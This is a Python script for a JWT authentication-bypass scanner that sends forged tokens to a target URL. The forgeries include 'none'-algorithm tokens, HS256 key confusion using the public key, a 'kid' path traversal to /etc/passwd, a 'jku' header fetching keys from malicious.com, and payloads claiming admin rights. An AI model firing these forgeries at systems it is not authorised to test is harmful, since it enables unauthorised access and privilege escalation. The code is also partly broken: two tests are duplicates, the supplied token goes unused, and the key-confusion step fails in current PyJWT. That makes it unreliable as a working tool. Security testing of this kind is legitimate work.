import jwt
import requests
import json
import time

class JWTConfusionScanner:
    def __init__(self, base_url, token, public_key=None, delay=1, success_indicators=None, failure_indicators=None):
        self.base_url = base_url
        self.token = token
        self.public_key = public_key
        self.delay = delay
        self.success_indicators = success_indicators or []
        self.failure_indicators = failure_indicators or []
        self.results = []

    def scan(self):
        self.test_none_algorithm()
        self.test_algorithm_switching()
        self.test_key_confusion()
        self.test_header_manipulation()
        self.test_payload_modification()
        self.generate_output()

    def test_none_algorithm(self):
        header = {"alg": "none"}
        token = jwt.encode({"some": "payload"}, key='', algorithm='none', headers=header)
        self.send_request(token, "None Algorithm Test")

    def test_algorithm_switching(self):
        if self.public_key:
            header = {"alg": "HS256"}
            token = jwt.encode({"some": "payload"}, key=self.public_key, algorithm='HS256', headers=header)
            self.send_request(token, "Algorithm Switching Test")

    def test_key_confusion(self):
        if self.public_key:
            header = {"alg": "HS256"}
            token = jwt.encode({"some": "payload"}, key=self.public_key, algorithm='HS256', headers=header)
            self.send_request(token, "Key Confusion Test")

    def test_header_manipulation(self):
        headers = [
            {"kid": "../../../../etc/passwd"},
            {"jku": "http://malicious.com/jwks.json"}
        ]
        for header in headers:
            token = jwt.encode({"some": "payload"}, key='', algorithm='HS256', headers=header)
            self.send_request(token, f"Header Manipulation Test: {header}")

    def test_payload_modification(self):
        payloads = [
            {"admin": True},
            {"role": "admin"}
        ]
        for payload in payloads:
            token = jwt.encode(payload, key='', algorithm='HS256')
            self.send_request(token, f"Payload Modification Test: {payload}")

    def send_request(self, token, test_name):
        headers = {"Authorization": f"Bearer {token}"}
        response = requests.get(self.base_url, headers=headers)
        self.analyze_response(response, test_name)
        time.sleep(self.delay)

    def analyze_response(self, response, test_name):
        result = {
            "test_name": test_name,
            "status_code": response.status_code,
            "content_length": len(response.content),
            "success": any(indicator in response.text for indicator in self.success_indicators),
            "failure": any(indicator in response.text for indicator in self.failure_indicators)
        }
        self.results.append(result)

    def generate_output(self):
        with open("scan_results.json", "w") as f:
            json.dump(self.results, f, indent=4)

if __name__ == "__main__":
    base_url = "http://example.com/protected"
    token = "your_jwt_token_here"
    public_key = "your_public_key_here"
    scanner = JWTConfusionScanner(base_url, token, public_key)
    scanner.scan()